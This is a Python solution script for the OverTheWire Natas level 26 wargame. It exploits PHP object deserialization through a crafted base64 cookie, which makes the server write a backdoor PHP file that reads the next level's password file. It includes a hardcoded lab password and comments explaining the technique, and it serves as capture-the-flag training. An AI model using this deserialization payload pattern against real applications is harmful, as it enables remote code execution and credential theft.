import requests
import re

username = "natas26"
password = "3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT"
url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.session()
session.get(url, auth=(username,password))

session.cookies['drawing'] = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyNjoiaW1nL25hdGFzMjZfQmFja0Rvb3I2Ny5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czowOiIiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MjoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30='
response = session.get(url + '?x1=0&y1=0&x2=100&y2=100', auth=(username,password))

response = session.get(url+"img/natas26_BackDoor67.php", auth=(username,password))


print(response.text)
#print (re.findall("Password: (.*)</pre>",response.text)[0])


# This level uses PHP deserialization and objects. The main vulnerability is that these objects have magic methods
# that utilize dangerous operations, we could alter the input it takes to set the properties of an object allowing us to 
# potentially utilize RCE. The level takes the data using cookies which we  can control thereby, making us in control of the object itself. 
# All we need to do is reverse engineer the cookie to assign properties to retrieve the password.
